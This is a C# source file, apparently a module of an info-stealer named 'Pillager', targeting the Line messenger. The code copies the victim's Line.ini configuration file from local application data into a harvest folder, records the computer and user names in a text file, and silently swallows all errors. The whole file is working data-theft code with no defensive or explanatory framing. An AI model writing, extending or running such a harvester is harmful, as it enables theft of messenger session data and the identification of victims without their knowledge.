using System;
using System.IO;

namespace Pillager.Messengers
{
    internal class Line
    {
        public static string MessengerName = "Line";

        public static void Save(string path)
        {
            try
            {
                string inipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Data/Line.ini");
                if (!File.Exists(inipath)) return;
                string savepath = Path.Combine(path, MessengerName);
                Directory.CreateDirectory(savepath);
                File.Copy(inipath, Path.Combine(savepath, "Line.ini"));
                string info = "Computer Name = " + Environment.MachineName + Environment.NewLine + "User Name = " + Environment.UserName;
                File.WriteAllText(Path.Combine(savepath, "infp.txt"), info);
            }
            catch { }
        }
    }
}
